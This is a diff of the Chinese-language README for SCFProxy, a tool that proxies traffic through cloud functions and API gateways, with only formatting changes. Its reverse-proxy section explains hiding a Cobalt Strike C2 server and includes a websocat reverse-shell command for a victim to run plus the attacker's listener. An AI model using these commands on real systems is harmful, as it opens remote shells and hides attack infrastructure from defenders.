@@ -1,6 +1,7 @@
 # SCFProxy
 SCFProxy 是一个基于云服务商提供的云函数及 API 网关功能实现多种代理的工具。
 
+
 # 安装
 前往 [Release](https://github.com/shimmeris/SCFProxy/releases/) 页面下载对应系统压缩包即可。如仍需使用 Python 旧版，请切换至 [Python](https://github.com/shimmeris/SCFProxy/tree/Python) 分支
 
@@ -21,7 +22,7 @@ SCFProxy 是一个基于云服务商提供的云函数及 API 网关功能实现
 
 ## HTTP 代理
 ### 部署
-```shell
+```console
 scfproxy deploy http -p provider_list -r region_list
 ```
 `provider_list` 与 `region_list` 传入的参数列表以 `,` 分隔。
@@ -36,7 +37,7 @@ scfproxy deploy http -p provider_list -r region_list
 对于提供多个 `provider` 的情况下，将对每个 `provider` 进行上述 `region` 形式的解析与查找，不存在的 `region` 将被忽略
 
 例子：
-```shell
+```console
 scfproxy deploy http -p alibaba,tencent -r ap-1,eu-*,cn-shanghai
 ```
 
@@ -45,13 +46,13 @@ scfproxy deploy http -p alibaba,tencent -r ap-1,eu-*,cn-shanghai
 2. 在 `tencent` 上部署 `ap-beijing` 区域的 http 代理
 
 ### 运行
-```shell
+```console
 scfproxy http -l port [-c cert_path] [-k key_path]
 ```
 首次运行会在 `~/.confg/scfproxy/cert` 目录生成 `scfproxy.cer` 及 `scfproxy.key` 证书，需要将其导入系统证书并信任才可以代理 https 请求。
 
 ### 清理
-```shell
+```console
 scfproxy clear http -p provider_list -r region_list [--completely]
 ```
 
@@ -59,7 +60,7 @@ scfproxy clear http -p provider_list -r region_list [--completely]
 
 ## SOCKS5 代理
 ### 部署
-```shell
+```console
 scfproxy deploy socks -p provider_list -r region_list -a address [-k key] --auth [user:pass]
 ```
 `-a address` 用于指定云函数回连的 vps 地址
@@ -69,7 +70,7 @@ scfproxy deploy socks -p provider_list -r region_list -a address [-k key] --auth
 `--auth [user:pass]` 用于指定 socks 认证信息，默认无认证
 
 ### 运行
-```shell
+```console
 scfproxy socks -l socks_port -s scf_port -k key
 ```
 `-l socks_port` 监听 socks_port，等待用户的 socks5 连接
@@ -80,7 +81,7 @@ scfproxy socks -l socks_port -s scf_port -k key
 
 
 ### 清理
-```shell
+```console
 scfproxy clear socks -p provider_list -r region_list [--completely]
 ```
 
@@ -88,7 +89,7 @@ scfproxy clear socks -p provider_list -r region_list [--completely]
 
 ## 反向代理
 ### 部署
-```shell
+```console
 scfproxy deploy reverse -p provider_list -r region_list -o origin [--ip ip_list]
 ```
 
@@ -102,7 +103,7 @@ scfproxy deploy reverse -p provider_list -r region_list -o origin [--ip ip_list]
 #### C2 隐藏
 以 cobaltstrike 为例，只需将 api 的域名填入 listener 的 host
 
-```shell
+```console
 scfproxy deploy reverse ... -o http://vps --ip victim
 ```
 
@@ -112,17 +113,17 @@ scfproxy deploy reverse ... -o http://vps --ip victim
 #### 反弹 shell 地址隐藏
 借助 [websocat](https://github.com/vi/websocat) 工具可实现反弹 shell 的功能。
 
-```shell
+```console
 scfproxy deploy reverse ... -o ws://vps --ip victim
 ```
 
 受害者端执行：
-```shell
+```console
 websocat ws://reverse_proxy_address  sh-c:'/bin/bash -i 2>&1' --binary -v --compress-zlib
 ```
 
 攻击者 vps 执行：
-```shell
+```console
 websocat ws-l:0.0.0.0:port - --binary -E --uncompress-zlib
 ```
 
@@ -132,7 +133,7 @@ websocat ws-l:0.0.0.0:port - --binary -E --uncompress-zlib
 #### 内网穿透地址隐藏
 该使用场景需要支持 websocket 协议的内网穿透软件。
 
-```shell
+```console
 scfproxy deploy reverse ... -o ws://vps --ip victim
 ```
 
@@ -155,7 +156,7 @@ use_compression = true
 ![frp](img/frp.png)
 
 ### 清理
-```shell
+```console
 scfproxy clear http -p provider_list -r region_list -o origin
 ```
 与 HTTP 及 SOCKS 代理不同，反向代理没有 `--completely` 参数，但需要指定 `origin` 参数用于定位需要删除的服务
